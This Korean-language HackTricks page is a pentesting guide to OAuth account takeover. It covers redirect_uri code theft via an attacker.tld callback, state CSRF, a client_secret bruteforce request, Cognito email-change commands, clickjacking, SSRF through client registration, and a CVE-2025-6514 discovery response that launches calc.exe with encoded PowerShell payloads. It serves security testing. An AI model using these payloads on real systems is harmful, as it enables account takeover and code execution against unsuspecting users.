# OAuth to Account takeover

{{#include ../banners/hacktricks-training.md}}

## 기본 정보 <a href="#d4a8" id="d4a8"></a>

OAuth는 여러 버전을 제공하며 기본적인 내용은 [OAuth 2.0 documentation](https://oauth.net/2/)에서 확인할 수 있습니다. 이 글은 주로 널리 사용되는 [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/)에 초점을 맞추며, 이는 **어떤 애플리케이션이 다른 애플리케이션(authorization server)에 있는 사용자의 계정에 접근하거나 계정에서 동작을 수행할 수 있게 해주는 권한 프레임워크**를 제공합니다.

가령 개인 게시물(비공개 포함)을 모두 보여주는 것을 목적으로 하는 가상의 웹사이트 _**https://example.com**_이 있다고 가정해봅시다. 이를 위해 OAuth 2.0이 사용됩니다. _https://example.com_은 당신의 소셜 미디어 게시물에 **액세스할 권한을 요청**할 것입니다. 그 결과, _https://socialmedia.com_에서 동의 화면이 표시되어 **요청되는 권한과 요청을 하는 개발자**를 보여줍니다. 당신이 허용하면 _https://example.com_은 당신을 대신해 **게시물에 접근할 수 있는** 권한을 얻게 됩니다.

OAuth 2.0 프레임워크에서 다음 구성 요소들을 이해하는 것이 중요합니다:

- **resource owner**: 당신(사용자/엔티티)으로서 소셜 미디어 계정의 게시물과 같은 리소스에 대한 접근을 허가합니다.
- **resource server**: 애플리케이션이 `access token`을 받아 `resource owner`를 대신해 인증된 요청을 처리하는 **서버**, 예: **https://socialmedia.com**.
- **client application**: `resource owner`로부터 권한을 얻으려 하는 **애플리케이션**, 예: **https://example.com**.
- **authorization server**: `resource owner`의 인증과 권한 부여가 완료된 후 `client application`에 `access tokens`를 발급하는 **서버**, 예: **https://socialmedia.com**.
- **client_id**: 애플리케이션을 위한 공개적이고 고유한 식별자입니다.
- **client_secret:** 애플리케이션과 authorization server만 아는 비밀 키로, `access_tokens` 생성에 사용됩니다.
- **response_type**: 요청하는 **토큰의 종류**를 지정하는 값(예: `code`)입니다.
- **scope**: `client application`이 `resource owner`에게 요청하는 **접근 수준**입니다.
- **redirect_uri**: 인가 후 사용자가 리디렉션되는 **URL**입니다. 일반적으로 사전에 등록된 redirect URL과 일치해야 합니다.
- **state**: 사용자가 authorization server로 리디렉션되었다가 돌아올 때 데이터를 **유지하기 위한 파라미터**입니다. 고유성이 CSRF 보호 메커니즘으로서 중요합니다.
- **grant_type**: 반환될 토큰의 종류와 grant 방식을 나타내는 파라미터입니다.
- **code**: `authorization server`가 발급하는 인가 코드로, `client_id`와 `client_secret`과 함께 client application이 `access_token`을 획득할 때 사용됩니다.
- **access_token**: `client application`이 `resource owner`를 대신해 API 요청에 사용하는 **토큰**입니다.
- **refresh_token**: 사용자를 재승인하지 않고도 새로운 `access_token`을 얻을 수 있게 해줍니다.

### 흐름

실제 OAuth 흐름은 다음과 같이 진행됩니다:

1. 당신이 [https://example.com](https://example.com)에 접속하여 “Integrate with Social Media” 버튼을 클릭합니다.
2. 사이트는 [https://socialmedia.com](https://socialmedia.com)으로 당신의 게시물에 접근할 수 있도록 https://example.com의 애플리케이션에 권한을 요청하는 요청을 보냅니다. 요청은 다음과 같은 형식으로 구성됩니다:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. 그 다음 동의 페이지가 표시됩니다.
4. 승인 후, 소셜 미디어는 `redirect_uri`에 `code`와 `state` 파라미터를 포함한 응답을 보냅니다:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com은 이 `code`와 `client_id`, `client_secret`을 사용해 서버 측에서 요청을 보내 귀하를 대신해 `access_token`을 얻고, 귀하가 동의한 권한에 접근할 수 있도록 합니다:
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. Finally, the process concludes as https://example.com employs your `access_token` to make an API call to Social Media to access

## 취약점 <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Per [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), authorization server는 브라우저를 반드시 **사전에 등록된, 정확한 redirect URIs**로만 리디렉트해야 합니다. 여기의 어떤 약점도 공격자가 피해자를 악성 authorization URL로 유도해 IdP가 피해자의 `code`(및 `state`)를 공격자 엔드포인트로 직접 전달하게 만들고, 공격자가 이를 교환하여 토큰을 탈취하도록 허용합니다.

일반적인 공격 흐름:

1. `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` 를 조작하여 피해자에게 전송합니다.
2. 피해자가 인증하고 scopes를 승인합니다.
3. IdP가 `attacker.tld/callback?code=<victim-code>&state=...` 로 리디렉트하면 공격자는 요청을 기록하고 즉시 code를 교환합니다.

검사할 일반적인 검증 버그:

- **검증 없음** – 어떤 절대 URL도 허용되어 즉시 code가 탈취됩니다.
- **호스트에 대한 약한 부분문자열/정규식 검사** – `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, 또는 `match.com@evil.com` 같은 유사 도메인으로 우회할 수 있습니다.
- **IDN homograph mismatches** – 검증은 punycode 형식(`xn--`)에서 수행되지만 브라우저는 공격자가 제어하는 유니코드 도메인으로 리디렉트합니다.
- **허용된 호스트에서 임의의 경로 허용** – `redirect_uri`를 `/openredirect?next=https://attacker.tld` 또는 어떤 XSS/user-content endpoint로 지정하면 체인된 리디렉트, Referer headers, 또는 주입된 JavaScript를 통해 code가 leak됩니다.
- **정규화 없이 디렉터리 제약 적용** – `/oauth/*` 같은 패턴은 `/oauth/../anything`으로 우회될 수 있습니다.
- **와일드카드 서브도메인** – `*.example.com`을 허용하면 dangling DNS, S3 bucket 등 어떤 takeover도 즉시 유효한 callback을 제공합니다.
- **Non-HTTPS callbacks** – `http://` URI를 허용하면 네트워크 공격자(Wi-Fi, corporate proxy)가 전송 중에 code를 가로챌 기회를 얻습니다.

또한 보조적인 redirect 형태의 매개변수들(`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri` 등) 및 OpenID discovery 문서(`/.well-known/openid-configuration`)를 검토하여 동일한 검증 버그를 물려받을 수 있는 추가 엔드포인트가 있는지 확인하세요.

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

이 버그 바운티 리포트 [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html)에서 언급된 바와 같이, 리디렉트 **URL이 서버의 응답에 반사되어** 사용자가 인증한 후 **XSS에 취약해질 수 있습니다**. 테스트할 수 있는 가능한 페이로드:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - `state` 매개변수의 부적절한 처리 <a href="#bda5" id="bda5"></a>

`state` 매개변수는 Authorization Code flow의 CSRF 토큰입니다: 클라이언트는 **브라우저 인스턴스별로 암호학적으로 랜덤한 값**을 생성하고, 해당 브라우저만 읽을 수 있는 위치(쿠키, local storage 등)에 저장한 뒤 인가 요청에 포함하고, 응답이 같은 값을 반환하지 않으면 거부해야 합니다. 값이 정적이거나 예측 가능하거나 선택 사항이거나 사용자의 세션에 묶여 있지 않으면, 공격자는 자신의 OAuth 흐름을 완료하고 최종 `?code=` 요청을 캡처(전송하지 않고 보관)한 뒤, 이후 희생자 브라우저가 그 요청을 재생하도록 강제하여 희생자 계정이 공격자의 identity provider 프로필과 연결되게 할 수 있습니다.

재생 패턴은 항상 동일합니다:

1. 공격자가 자신의 계정으로 IdP에 인증하고 마지막 리디렉트(포함된 `code` 및 `state`)를 가로챕니다.
2. 그 요청을 내려놓고 URL을 보관한 뒤, 링크, iframe, 자동 제출 폼 등 어떤 CSRF primitive를 이용해 이후에 희생자 브라우저가 그 URL을 로드하게 만듭니다.
3. 클라이언트가 `state`를 강제하지 않으면 애플리케이션은 공격자의 인가 결과를 소비하고 공격자를 희생자의 앱 계정에 로그인시킵니다.

테스트 시 `state` 처리에 대한 실무 체크리스트:

- **Missing `state` entirely** – 파라미터가 전혀 존재하지 않으면 전체 로그인 흐름이 CSRFable합니다.
- **`state` not required** – 초기 요청에서 제거해 보세요; IdP가 여전히 코드를 발급하고 클라이언트가 이를 수락하면 방어는 opt-in입니다.
- **Returned `state` not validated** – 응답의 값을 변조해보세요 (Burp, MITM proxy). 불일치 값을 수용하면 저장된 토큰이 비교되지 않는 것을 의미합니다.
- **Predictable or purely data-driven `state`** – 많은 앱이 리디렉트 경로나 JSON 블롭을 randomness 없이 `state`에 넣어 공격자가 유효 값을 추측하고 흐름을 재생할 수 있게 합니다. 데이터를 인코딩하기 전에 항상 강한 엔트로피를 prepend/append하세요.
- **`state` fixation** – 앱이 사용자가 `state` 값을 제공하게 허용(예: 조작된 authorization URL 통해)하고 그 값을 흐름 전반에 재사용하면, 공격자는 알려진 값을 고정하고 여러 희생자에게 재사용할 수 있습니다.

PKCE는 (특히 public clients에서) authorization code를 code verifier에 바인딩함으로써 `state`를 보완할 수 있지만, 웹 클라이언트는 여전히 cross-user CSRF/account-linking 버그를 방지하기 위해 `state`를 추적해야 합니다.

### Pre Account Takeover <a href="#ebe4" id="ebe4"></a>

1. **Without Email Verification on Account Creation**: 공격자는 희생자의 이메일을 사용해 사전에 계정을 생성할 수 있습니다. 이후 희생자가 타사 서비스를 이용해 로그인하면, 애플리케이션이 의도치 않게 이 타사 계정을 공격자가 미리 만든 계정과 연결해 무단 접근을 초래할 수 있습니다.
2. **Exploiting Lax OAuth Email Verification**: 공격자는 이메일을 검증하지 않는 OAuth 서비스를 악용해 계정을 등록한 뒤 해당 계정의 이메일을 희생자의 이메일로 변경할 수 있습니다. 이 방법도 첫 번째 시나리오와 유사하게 무단 계정 접근을 초래할 위험이 있습니다.

### Disclosure of Secrets <a href="#e177" id="e177"></a>

`client_id`는 의도적으로 공개되지만, **`client_secret`은 최종 사용자에게 절대 복구 가능해서는 안 됩니다**. 모바일 APK, 데스크탑 클라이언트, 또는 single-page 앱에 시크릿을 임베드한 Authorization Code 배포는 그 자격 증명을 다운로드 가능한 누구에게나 넘기는 것입니다. 공개 클라이언트를 검사할 때는 항상 다음을 확인하세요:

- APK/IPA, 데스크탑 인스톨러, 또는 Electron 앱을 언팩하고 `client_secret`, Base64 블롭(디코딩 시 JSON이 나오는 경우), 또는 하드코딩된 OAuth 엔드포인트를 grep하세요.
- 번들된 구성 파일(plist, JSON, XML)이나 디컴파일된 문자열에서 클라이언트 자격 증명을 검토하세요.

공격자가 시크릿을 추출하면, 약한 `redirect_uri`, 로그 등으로 얻은 희생자의 인가 `code`만 훔치면 합법적 앱을 거치지 않고도 `/token`에 독립적으로 요청해 access/refresh 토큰을 발급할 수 있습니다. 공개/네이티브 클라이언트는 **secrets를 보관할 수 없는 것으로 간주**하고, 정적 시크릿 대신 PKCE (RFC 7636)를 이용해 인스턴스별 code verifier 소유를 증명해야 합니다. 테스트 중에는 PKCE가 필수인지, 백엔드가 `client_secret` **또는** 유효한 `code_verifier`가 없는 토큰 교환을 실제로 거부하는지 확인하세요.

### Client Secret Bruteforce

You can try to **bruteforce the `client_secret`** of a service provider with the identity provider in order to be try to steal accounts.  
The request to BF may look similar to:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer/Header/Location artifacts leaking Code + State

클라이언트가 **code and state**를 가지고 있고, 이 값들이 **`location.href`** 또는 **`document.referrer`**에 나타나 제3자에게 전달되면, they leak. 반복되는 패턴 두 가지:

- **Classic Referer leak**: OAuth 리디렉션 이후, URL에 `?code=&state=`가 남아있는 모든 네비게이션은 이를 CDN/analytics/ads로 전송되는 **Referer** 헤더에 밀어넣는다.
- **Telemetry/analytics confused deputy**: 일부 SDKs (pixels/JS loggers)는 `postMessage` 이벤트에 반응하여 **메시지로 공급된 토큰을 사용해 현재 `location.href`/`referrer`를 백엔드 API로 전송**한다. 공격자가 해당 흐름에 자신의 토큰을 주입할 수 있다면(예: attacker-controlled postMessage relay를 통해), 이후 SDK의 API 요청 기록/로그를 읽어 피해자의 OAuth artifacts가 포함된 요청을 복구할 수 있다.


### Access Token Stored in Browser History

Authorization Code grant의 핵심 보장은 **access tokens가 리소스 소유자의 브라우저에 절대 도달하지 않는다**는 것이다. 구현체가 토큰을 클라이언트 측에 leak할 경우, 사소한 버그(XSS, Referer leak, proxy logging)만으로 계정이 즉시 탈취된다. 항상 다음을 확인하라:

- **Tokens in URLs** – `access_token`이 쿼리/프래그먼트에 나타나면 브라우저 히스토리, 서버 로그, analytics, 제3자에게 전송되는 Referer 헤더에 남는다.
- **Tokens transiting untrusted middleboxes** – 토큰을 HTTP로 반환하거나 디버깅/회사 프록시를 통해 전송하면 네트워크 관찰자가 이를 직접 캡처할 수 있다.
- **Tokens stored in JavaScript state** – React/Vue 스토어, 전역 변수, 직렬화된 JSON 블롭은 origin의 모든 스크립트(예: XSS payloads 또는 악성 확장 포함)에 토큰을 노출한다.
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage`는 공유 기기에서 로그아웃 후에도 토큰을 오래 유지하며 스크립트로 접근 가능하다.

이러한 발견 중 어느 하나라도 보통 CSP bypass나 DOM XSS 같은 “low” 버그를 전체 API takeover로 승격시킨다. 공격자가 단순히 leaked bearer token을 읽어 재생(replay)할 수 있기 때문이다.

### Everlasting Authorization Code

Authorization codes는 **short-lived, single-use, and replay-aware**여야 한다. 흐름을 검사할 때는 `code`를 캡처한 후 다음을 시험하라:

- **Test the lifetime** – RFC 6749는 분 단위를 권장한다, 시간 단위가 아니다. 5–10분 후에 코드를 교환해 보라; 여전히 작동하면 any leaked code의 노출 창이 과도하다.
- **Test sequential reuse** – 동일한 `code`를 두 번 전송하라. 두 번째 요청에서도 또 다른 토큰을 발급하면 공격자가 세션을 무기한 복제할 수 있다.
- **Test concurrent redemption/race conditions** – 토큰 요청을 병렬로 두 번 발사하라 (Burp intruder, turbo intruder). 취약한 발급자는 때때로 둘 다 허용한다.
- **Observe replay handling** – 재사용 시도는 단순 실패에 그치지 않고 그 코드로 이미 발행된 모든 토큰을 폐기해야 한다. 그렇지 않으면 재생이 감지되어도 공격자의 첫 토큰이 활성 상태로 남는다.

replay 친화적인 코드와 어떤 `redirect_uri` 또는 로깅 버그를 결합하면 피해자가 정상 로그인 절차를 완료한 이후에도 지속적인 계정 접근이 가능해진다.

### Authorization/Refresh Token not bound to client

만약 **authorization code**를 얻어 **다른 client/app**으로 교환할 수 있다면 다른 계정을 takeover할 수 있다. 약한 바인딩을 테스트하려면:

- **app A**에 대한 `code`를 캡처하고 이를 **app B’s token endpoint**로 전송해 보라; 여전히 토큰을 받으면 audience binding이 깨진 것이다.
- 자신의 client ID에만 제한되어야 하는 first-party 토큰 발급 엔드포인트를 시험해 보라; 만약 코드만 검증하면서 임의의 `state`/`app_id`를 허용한다면, 실질적으로 더 높은 권한의 first-party 토큰을 발급하기 위한 **authorization-code swap**을 수행하게 된다.
- 클라이언트 바인딩이 nonce/redirect URI 불일치를 무시하는지 확인하라. 에러 페이지가 여전히 `location.href`를 기록하는 SDK를 로드한다면, 이를 Referer/telemetry leaks와 결합해 코드를 훔쳐 다른 곳에서 교환할 수 있다.

`code` → token을 교환하는 모든 엔드포인트는 발급한 클라이언트, redirect URI 및 nonce를 반드시 검증해야 한다; 그렇지 않으면 어떤 앱에서 도난당한 코드도 first-party access token으로 업그레이드될 수 있다.

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**이 글 확인**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

In this bug bounty report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) 에서 확인할 수 있듯, **AWS Cognito**가 사용자에게 반환하는 **token**은 사용자 데이터를 덮어쓸 수 있을 만큼의 권한을 가질 수 있다. 따라서 만약 다른 사용자 이메일로 사용자의 이메일을 변경할 수 있다면, 다른 계정을 **take over**할 수도 있다.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
For more detailed info about how to abuse AWS Cognito check [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### Abusing other Apps tokens <a href="#bda5" id="bda5"></a>

As [**mentioned in this writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), OAuth 흐름이 **code**가 아니라 **token**을 받도록 설계된 경우, 그 token이 해당 앱에 속하는지 검사하지 않으면 취약해질 수 있습니다.

이는 **attacker**가 자신의 애플리케이션에 **OAuth를 지원하고 Facebook으로 로그인하는 애플리케이션**을 만들 수 있기 때문입니다. 그런 다음 피해자가 **attacker의 application**에서 Facebook으로 로그인하면, attacker는 자신의 애플리케이션에 부여된 사용자의 **OAuth token**을 얻고 이를 이용해 피해자의 OAuth 애플리케이션에 피해자 user token으로 로그인할 수 있습니다.

> [!CAUTION]
> 따라서 attacker가 사용자를 자신의 OAuth 애플리케이션으로 유도하는 데 성공하면, token을 기대하고 그 token이 자신들의 app ID에 부여된 것인지 검사하지 않는 애플리케이션에서는 피해자 계정을 탈취할 수 있습니다.

### Two links & cookie <a href="#bda5" id="bda5"></a>

According to [**this writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), 공격자가 피해자로 하여금 **returnUrl**이 attacker 호스트를 가리키게 하는 페이지를 열도록 하는 것이 가능했습니다. 이 정보는 **RU**라는 쿠키에 저장되었고, 이후 단계에서 **prompt**가 사용자에게 attacker 호스트에 접근 권한을 줄지 묻도록 요구했습니다.

이 prompt를 우회하려면, 먼저 returnUrl을 사용해 RU 쿠키를 설정하는 OAuth 흐름을 시작하는 탭을 열고, prompt가 표시되기 전에 해당 탭을 닫은 다음 그 값을 포함하지 않는 새 탭을 열면 되었습니다. 그러면 **prompt**는 attacker 호스트에 대해 알리지 않지만 쿠키는 attacker 호스트로 설정되어 최종 리디렉션 시 **token이 attacker 호스트로 전송**됩니다.

### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>

As explained in [**this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), 일부 OAuth 구현은 GET 파라미터로 **`prompt`**를 None으로 지정할 수 있게 하여 (**`&prompt=none`**) 사용자가 이미 플랫폼에 로그인되어 있으면 웹에서 접근 권한을 확인하는 prompt를 표시하지 않도록 할 수 있습니다.

### response_mode

As [**explained in this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), 최종 URL에서 code가 어떤 위치에 제공될지 지정하기 위해 **`response_mode`** 파라미터를 사용할 수 있습니다:

- `response_mode=query` -> code가 GET 파라미터 안에 제공됩니다: `?code=2397rf3gu93f`
- `response_mode=fragment` -> code가 URL fragment 파라미터 안에 제공됩니다: `#code=2397rf3gu93f`
- `response_mode=form_post` -> code가 `code`라는 이름의 input을 가진 POST 폼 안에 제공됩니다
- `response_mode=web_message` -> code가 post message로 전송됩니다: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

OAuth 동의/로그인 대화상자는 Clickjacking의 이상적인 대상입니다: 프레임화가 가능하면 공격자는 커스텀 그래픽을 오버레이하고 실제 버튼을 숨겨 사용자가 위험한 scope를 승인하거나 계정을 연결하도록 속일 수 있습니다. 다음과 같은 PoC를 만드세요:

1. IdP authorization URL을 `<iframe sandbox="allow-forms allow-scripts allow-same-origin">` 안에 로드합니다.
2. 절대 위치/불투명도 트릭을 사용해 가짜 버튼을 숨겨진 **Allow**/**Approve** 컨트롤과 정렬합니다.
3. 선택적으로 파라미터(scope, redirect URI)를 미리 채워 두어 도난된 승인이 즉시 attacker에게 이득이 되도록 합니다.

테스트 시 IdP 페이지가 `X-Frame-Options: DENY/SAMEORIGIN` 또는 제한적인 `Content-Security-Policy: frame-ancestors 'none'`을 발행하는지 확인하세요. 둘 다 없으면 [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) 같은 도구로 위험을 입증하고 피해자가 얼마나 쉽게 attacker의 앱을 승인하는지 기록하세요. 추가 페이로드 아이디어는 [Clickjacking](clickjacking.md)을 참조하세요.

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

According to [**this blog post**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), 이 흐름은 **username**과 **password**로 OAuth에 로그인할 수 있게 하는 OAuth 흐름입니다. 이 간단한 흐름 동안 사용자가 수행할 수 있는 모든 동작에 접근할 수 있는 **token**이 반환되면 해당 token을 사용해 2FA를 우회할 수 있습니다.

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

This [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato)에서는 **referrer** 값을 기반으로 하는 **open redirect**를 악용해 OAuth를 통해 ATO를 달성할 수 있었던 방법을 설명합니다. 공격 흐름은 다음과 같았습니다:

1. Victim이 attacker의 웹페이지에 접속합니다.
2. Victim이 악성 링크를 열고 opener가 `response_type=id_token,code&prompt=none`를 추가 파라미터로 사용하여 Google OAuth 흐름을 시작합니다(이때 referrer는 attacker 웹사이트).
3. provider가 victim을 승인한 후 opener는 `redirect_uri` 파라미터 값(victim 웹)으로 30X 코드로 보냅니다. 이때 referer에는 여전히 attacker 웹사이트가 남아 있습니다.
4. victim의 웹사이트는 **referrer를 기반으로 open redirect를 트리거**하여 사용자를 attacker 웹사이트로 리디렉트합니다. `response_type`이 `id_token,code`였기 때문에 code는 URL의 **fragment**로 attacker에게 전송되어 attacker가 victim 사이트에서 Google을 통해 계정을 탈취할 수 있게 됩니다.

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **For further details of this technique.**

Dynamic Client Registration은 덜 명백하지만 중요한 보안 벡터로, 특히 **Server-Side Request Forgery (SSRF)** 공격에 취약할 수 있습니다. 이 엔드포인트는 OAuth 서버가 클라이언트 애플리케이션에 대한 세부 정보를 수신하게 하며, 여기에는 악용 가능한 민감한 URL이 포함될 수 있습니다.

Key Points:

- **Dynamic Client Registration**은 종종 `/register`에 매핑되며 `client_name`, `client_secret`, `redirect_uris` 및 로고나 JSON Web Key Sets (JWKs)용 URL과 같은 세부 정보를 POST로 받습니다.
- 이 기능은 **RFC7591** 및 **OpenID Connect Registration 1.0**에 정의된 사양을 따르며, SSRF에 취약할 수 있는 파라미터들을 포함합니다.
- 등록 프로세스는 여러 방식으로 SSRF에 서버를 노출시킬 수 있습니다:
  - **`logo_uri`**: 서버가 로고를 가져오려 시도하면 SSRF를 유발하거나 URL 처리 부실로 XSS를 초래할 수 있습니다.
  - **`jwks_uri`**: 클라이언트의 JWK 문서로 가리키는 URL로, 악의적으로 조작된 경우 서버가 공격자 제어 서버로 아웃바운드 요청을 하게 만들 수 있습니다.
  - **`sector_identifier_uri`**: `redirect_uris`의 JSON 배열을 참조하며, 서버가 이를 가져오면 SSRF 기회를 만들 수 있습니다.
  - **`request_uris`**: 클라이언트에 허용된 request URI 목록으로, 서버가 권한 부여 시작 시 이들을 가져오는 경우 악용될 수 있습니다.

**Exploitation Strategy:**

- `logo_uri`, `jwks_uri`, `sector_identifier_uri`와 같은 파라미터에 악성 URL을 넣어 새 클라이언트를 등록하면 SSRF를 유발할 수 있습니다.
- `request_uris`를 통한 직접 악용은 화이트리스트 제어로 완화될 수 있지만, 미리 등록된 공격자 제어 `request_uri`를 제공하면 권한 부여 단계 동안 SSRF를 촉발할 수 있습니다.

### OAuth/OIDC Discovery URL Abuse & OS Command Execution

Research on [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/) (impacting `mcp-remote` clients such as Claude Desktop, Cursor or Windsurf) shows how **dynamic OAuth discovery becomes an RCE primitive** whenever the client forwards IdP metadata straight to the operating system. 원격 MCP 서버는 discovery 교환(`/.well-known/openid-configuration` 또는 어떤 메타데이터 RPC)이 진행되는 동안 공격자가 제어하는 `authorization_endpoint`를 반환합니다. `mcp-remote ≤0.1.15`는 도착한 문자열을 시스템 URL 핸들러(`start`, `open`, `xdg-open` 등)로 호출했기 때문에 OS에서 지원하는 어떤 스킴/경로라도 로컬에서 실행되었습니다.

**Attack workflow**

1. 데스크탑 에이전트를 악의적 MCP/OAuth 서버로 가리킵니다 (`npx mcp-remote https://evil`). 에이전트는 `401`과 함께 메타데이터를 받습니다.
2. 서버는 다음과 같은 JSON으로 응답합니다:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
"authorization_endpoint": "file:/c:/windows/system32/calc.exe",
"token_endpoint": "https://evil/idp/token",
...
}
```
3. 클라이언트는 제공된 URI에 대해 OS handler를 실행합니다. Windows는 `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."` 같은 payload를 허용하고, macOS/Linux는 `file:///Applications/Calculator.app/...` 또는 등록된 경우 `cmd://bash -lc '<payload>'` 같은 custom schemes도 허용합니다.  
4. 사용자 상호작용 이전에 이 일이 발생하므로, **클라이언트를 공격자 서버와 통신하도록 단순히 구성하는 것만으로도 code execution이 발생합니다**.

## 테스트 방법

- HTTP(S)로 discovery를 수행하고 반환된 endpoints를 로컬에서 여는 OAuth-capable desktop/agent(예: Electron apps, CLI helpers, thick clients)를 대상으로 삼습니다.
- discovery 응답을 가로채거나 호스팅하여 `authorization_endpoint`, `device_authorization_endpoint`, 또는 유사한 필드를 `file://`, `cmd://`, UNC 경로 또는 기타 위험한 schemes로 교체합니다.
- 클라이언트가 scheme/host를 검증하는지 관찰합니다. 검증이 없으면 사용자 컨텍스트에서 즉시 execution이 발생하며 문제가 입증됩니다.
- 다양한 schemes로 반복하여 전체 attack surface를 매핑합니다(예: `ms-excel:`, `data:text/html,`, custom protocol handlers) 및 cross-platform reach를 입증합니다.

## OAuth providers Race Conditions

테스트 중인 플랫폼이 OAuth provider인 경우 [**read this to test for possible Race Conditions**](race-condition.md).

## Mutable Claims Attack

OAuth에서 sub 필드는 사용자를 고유하게 식별하지만, 그 형식은 Authorization Server마다 다릅니다. 사용자 식별을 표준화하기 위해 일부 클라이언트는 이메일이나 사용자 핸들을 사용합니다. 그러나 이는 다음과 같은 위험이 있습니다:

- 일부 Authorization Server는 이러한 속성(예: email)이 불변으로 유지되는지 보장하지 않습니다.
- 특정 구현—예: **"Login with Microsoft"**—에서 클라이언트는 email 필드에 의존하는데, 해당 필드는 **user-controlled by the user in Entra ID**이며 검증되지 않습니다.
- 공격자는 자체 Azure AD 조직(예: doyensectestorg)을 만들어 Microsoft 로그인을 수행함으로써 이를 악용할 수 있습니다.
- Object ID (stored in sub)는 불변하고 안전하더라도, 변경 가능한 email 필드에 의존하면 account takeover를 초래할 수 있습니다(예: victim@gmail.com 같은 계정 탈취).

## Client Confusion Attack

In a **Client Confusion Attack**, OAuth Implicit Flow를 사용하는 애플리케이션이 최종 access token이 자사 Client ID용으로 생성된 것인지 검증하지 못합니다. 공격자는 Google의 OAuth Implicit Flow를 사용하는 공개 웹사이트를 만들어 수천 명의 사용자를 속여 로그인하게 하고, 그 결과 공격자 사이트용으로 발급된 access token을 수집합니다. 이 사용자가 토큰의 Client ID를 검증하지 않는 다른 취약한 웹사이트에도 계정을 가지고 있다면, 공격자는 수집한 토큰을 재사용해 피해자를 사칭하고 계정을 탈취할 수 있습니다.

## Scope Upgrade Attack

The **Authorization Code Grant** 유형은 사용자 데이터를 전송하기 위한 안전한 server-to-server 통신을 포함합니다. 그러나 **Authorization Server**가 Access Token Request의 scope 파라미터(RFC에 정의되어 있지 않은 파라미터)를 암묵적으로 신뢰하면, 악의적 애플리케이션이 더 높은 scope를 요청하여 authorization code의 권한을 업그레이드할 수 있습니다. **Access Token**이 생성된 후에는 **Resource Server**가 이를 검증해야 합니다: JWT 토큰의 경우 JWT 서명을 확인하고 client_id 및 scope 같은 데이터를 추출해야 하며, 랜덤 문자열 토큰의 경우 서버는 Authorization Server에 쿼리하여 토큰의 상세 정보를 조회해야 합니다.

## Redirect Scheme Hijacking

모바일 OAuth 구현에서 앱들은 Authorization Codes를 포함한 리디렉트를 받기 위해 **custom URI schemes**를 사용합니다. 그러나 여러 앱이 동일한 scheme을 디바이스에 등록할 수 있기 때문에, 정당한 클라이언트만이 리디렉트 URI를 제어한다는 가정이 깨집니다. 예를 들어 Android에서는 `com.example.app://` 같은 Intent URI가 앱의 intent-filter에 정의된 scheme 및 선택적 필터에 따라 처리됩니다. Android의 intent 해석은 특히 scheme만 명시된 경우 폭넓을 수 있기 때문에, 공격자는 정교하게 구성된 intent filter를 가진 악성 앱을 등록하여 authorization code를 하이재킹할 수 있습니다. 이는 Ostorlab의 assessment flowchart에 설명된 것처럼, 사용자 상호작용(여러 앱이 intent를 처리할 수 있을 때)을 통해서나 특정 필터의 우회 기법을 통해 **enable an account takeover**할 수 있습니다.

## References

